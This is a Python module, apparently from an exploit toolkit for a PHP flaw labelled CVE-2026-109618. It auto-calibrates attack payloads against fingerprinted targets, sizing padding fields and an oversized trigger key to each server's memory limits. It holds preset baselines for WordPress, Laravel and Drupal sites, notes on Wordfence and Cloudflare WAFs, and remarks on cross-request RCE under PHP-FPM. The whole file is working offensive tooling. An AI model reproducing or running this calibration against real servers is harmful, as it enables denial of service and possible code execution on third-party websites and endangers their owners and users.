"""
CVE-2026-109618 — Auto-calibration engine.

Computes exploit payload parameters from detected target properties without
requiring a diagnostic endpoint (diag.php / phpinfo).

Three modes:
  1. Formula — known memory_limit → exact n_pad/trigger computation, zero requests
  2. Binary search — unknown memory_limit → probe with increasing payloads until crash
  3. Constraint solver — adjusts for post_max_size, nginx body limit, max_input_vars

Memory model (from lab measurements):
  Each urlencoded field: zend_string(key) + zend_string(value) + Bucket(32) + zval(16)
  zend_string overhead: 32 bytes header + len + 1 NUL
  PHP parser allocations add ~40-60 bytes per field (key copy, bucket init)
  Total per pad field ≈ key_alloc + value_alloc + 100 bytes overhead

  Trigger: sub-array a[k0]=v .. a[kN]=v creates a HashTable; the oversized
  a[TTT...T][z]=1 key causes zend_string_init() OOM AFTER nNumUsed++.
"""
from __future__ import annotations

from dataclasses import dataclass, field

from .versions import CMSType
from .fingerprint import TargetInfo


ZEND_STRING_HEADER = 32
BUCKET_OVERHEAD = 32
ZVAL_SIZE = 16
PER_FIELD_OVERHEAD = 100
MEMORY_AMPLIFICATION = 2.0

BASELINE_MEMORY: dict[str, int] = {
    "fpm-fcgi": 340_000,
    "apache2handler": 450_000,
    "litespeed": 400_000,
    "cgi-fcgi": 340_000,
    "cli-server": 350_000,
    "cli": 300_000,
    "default": 400_000,
}

CMS_BASELINES: dict[CMSType, int] = {
    CMSType.WORDPRESS: 3_500_000,
    CMSType.LARAVEL: 4_000_000,
    CMSType.BACKPACK: 4_500_000,
    CMSType.DRUPAL: 3_000_000,
    CMSType.GENERIC_PHP: 400_000,
}


@dataclass
class ExploitPreset:
    n_pad: int = 0
    pad_value_size: int = 32767
    n_array_keys: int = 30
    trigger_key_len: int = 0
    payload_size: int = 0
    memory_target: int = 0
    body_limit: int = 0
    max_input_vars: int = 1000
    encoding: str = "urlencoded"
    notes: list[str] = field(default_factory=list)

    @property
    def total_vars(self) -> int:
        return self.n_pad + self.n_array_keys + 1

    @property
    def feasible(self) -> bool:
        return (self.n_pad > 0 and
                self.trigger_key_len > 0 and
                self.payload_size > 0 and
                self.total_vars <= self.max_input_vars)

    def describe(self) -> str:
        lines = [
            f"Preset for {self.memory_target // (1024*1024)}M memory_limit:",
            f"  n_pad={self.n_pad}, pad_value_size={self.pad_value_size}",
            f"  n_array_keys={self.n_array_keys}",
            f"  trigger_key_len={self.trigger_key_len:,}",
            f"  total_vars={self.total_vars} (max_input_vars={self.max_input_vars})",
            f"  payload_size={self.payload_size:,} bytes ({self.payload_size / 1024:.0f} KB)",
            f"  body_limit={self.body_limit:,} bytes",
            f"  encoding={self.encoding}",
        ]
        if self.notes:
            lines.append("  notes:")
            for n in self.notes:
                lines.append(f"    - {n}")
        return "\n".join(lines)


def _estimate_baseline(target: TargetInfo) -> int:
    cms_base = CMS_BASELINES.get(target.cms.cms_type, 1_500_000)
    sapi_base = BASELINE_MEMORY.get(target.php.sapi or "default", 1_500_000)
    return max(cms_base, sapi_base)


def _field_memory_cost(key_len: int, value_len: int) -> int:
    key_alloc = ZEND_STRING_HEADER + key_len + 1
    val_alloc = ZEND_STRING_HEADER + value_len + 1
    return key_alloc + val_alloc + BUCKET_OVERHEAD + ZVAL_SIZE + PER_FIELD_OVERHEAD


def _body_size_urlencoded(n_pad: int, pad_value_size: int,
                          n_array_keys: int, trigger_key_len: int) -> int:
    size = 0
    for i in range(n_pad):
        key = f"p{i:03d}"
        size += len(key) + 1 + pad_value_size  # key=value
        if i > 0:
            size += 1  # & separator
    for i in range(n_array_keys):
        field_str = f"a[k{i:04d}]=v"
        size += len(field_str) + 1
    size += 1 + 2 + trigger_key_len + 6  # &a[TTT...T][z]=1
    return size


def calibrate_formula(memory_limit: int, baseline: int,
                      body_limit: int, max_input_vars: int = 1000,
                      ) -> ExploitPreset:
    """Compute exact payload parameters from known memory_limit.

    Memory model: PHP keeps raw POST body in memory AND creates parsed
    zend_strings. Effective memory ≈ MEMORY_AMPLIFICATION × body_size.

    For memory_limit ≤ amp × body_limit: fill + trigger is feasible.
    For memory_limit > amp × body_limit: note the constraint.
    """
    preset = ExploitPreset(
        memory_target=memory_limit,
        body_limit=body_limit,
        max_input_vars=max_input_vars,
    )

    available = memory_limit - baseline
    if available <= 0:
        preset.notes.append("memory_limit <= baseline")
        return preset

    max_memory_from_body = int(body_limit * MEMORY_AMPLIFICATION)
    if max_memory_from_body < available * 0.6:
        needed = int(available / MEMORY_AMPLIFICATION)
        preset.notes.append(
            f"Body {body_limit // (1024*1024)}M → ~{max_memory_from_body // (1024*1024)}M memory; "
            f"need post_max_size≥{needed // (1024*1024)}M for {memory_limit // (1024*1024)}M target"
        )

    usable_body = min(body_limit, int(available / MEMORY_AMPLIFICATION))
    if usable_body < 4096:
        preset.notes.append("Insufficient body budget for this memory_limit")
        return preset

    target_pad_wire = int(usable_body * 0.80)
    max_pad = max_input_vars - 32

    pad_value_size = 32767
    pad_wire_cost = 5 + pad_value_size  # "pNNN=" + value
    n_pad_needed = max(1, target_pad_wire // pad_wire_cost)

    if n_pad_needed > max_pad:
        pad_value_size = max(1024, (target_pad_wire // max_pad) - 6)
        pad_wire_cost = 5 + pad_value_size
        preset.notes.append(f"Scaled pad_value_size to {pad_value_size} (max_input_vars={max_input_vars})")

    n_pad = min(max(1, target_pad_wire // pad_wire_cost), max_pad)

    actual_pad_wire = n_pad * (pad_wire_cost + 1)
    remaining_wire = usable_body - actual_pad_wire
    if remaining_wire < 512:
        n_pad = max(1, n_pad - 2)
        actual_pad_wire = n_pad * (pad_wire_cost + 1)
        remaining_wire = usable_body - actual_pad_wire

    array_wire = 30 * 14  # ~14 bytes per "a[kNNNN]=v&"
    trigger_key_len = max(remaining_wire - array_wire - 20, 256)

    body_size = _body_size_urlencoded(n_pad, pad_value_size, 30, trigger_key_len)

    if body_size > body_limit:
        excess = body_size - body_limit + 100
        trigger_key_len = max(256, trigger_key_len - excess)
        body_size = _body_size_urlencoded(n_pad, pad_value_size, 30, trigger_key_len)

    if body_size > body_limit and pad_value_size > 2048:
        scale = (body_limit * 0.85) / body_size
        pad_value_size = max(1024, int(pad_value_size * scale))
        pad_wire_cost = 5 + pad_value_size
        n_pad = min(max(1, target_pad_wire // pad_wire_cost), max_pad)
        actual_pad_wire = n_pad * (pad_wire_cost + 1)
        remaining_wire = usable_body - actual_pad_wire
        trigger_key_len = max(remaining_wire - array_wire - 20, 256)
        body_size = _body_size_urlencoded(n_pad, pad_value_size, 30, trigger_key_len)
        preset.notes.append(f"Adjusted pad_value_size to {pad_value_size}")

    est_memory = int(body_size * MEMORY_AMPLIFICATION) + baseline
    if est_memory < memory_limit * 0.70:
        preset.notes.append(
            f"~{est_memory // (1024*1024)}M estimated vs {memory_limit // (1024*1024)}M limit — "
            "binary search may be needed"
        )

    preset.n_pad = n_pad
    preset.pad_value_size = pad_value_size
    preset.trigger_key_len = trigger_key_len
    preset.payload_size = body_size

    return preset


def calibrate_for_target(target: TargetInfo) -> ExploitPreset:
    """Auto-calibrate exploit parameters from fingerprinted target info."""
    baseline = _estimate_baseline(target)
    memory_limit = target.server.effective_memory_limit
    body_limit = target.server.effective_body_limit
    max_vars = target.server.effective_max_input_vars

    preset = calibrate_formula(memory_limit, baseline, body_limit, max_vars)

    if target.cms.waf_detected:
        preset.notes.append(f"WAF detected: {target.cms.waf_detected}")
        if target.cms.waf_detected == "Wordfence":
            if preset.payload_size > 10 * 1024 * 1024:
                preset.notes.append("Wordfence blocks requests > 10MB")
        if target.cms.waf_detected in ("Cloudflare", "Akamai"):
            preset.notes.append("CDN/WAF may rate-limit or block")

    if target.php.sapi == "fpm-fcgi":
        preset.notes.append("FPM: fast_shutdown=true blocks same-request RCE")
        preset.notes.append("Ghost creation confirmed; cross-request exploitation")

    return preset


# -- Preset table for common configurations -----------------------------------

COMMON_PRESETS: dict[str, ExploitPreset] = {}


def _init_common_presets() -> None:
    for mem_mb in (4, 8, 16, 32, 64, 128, 256, 512):
        mem = mem_mb * 1024 * 1024

        for sapi, sapi_base in [("bare", 400_000), ("wordpress", 3_500_000)]:
            baseline = sapi_base
            if mem_mb <= 8:
                body_limit = 8 * 1024 * 1024
            elif mem_mb <= 64:
                body_limit = 8 * 1024 * 1024
            else:
                body_limit = min(mem, 128 * 1024 * 1024)

            preset = calibrate_formula(mem, baseline, body_limit)
            if sapi == "bare":
                COMMON_PRESETS[f"{mem_mb}M"] = preset
            COMMON_PRESETS[f"{mem_mb}M-{sapi}"] = preset


_init_common_presets()
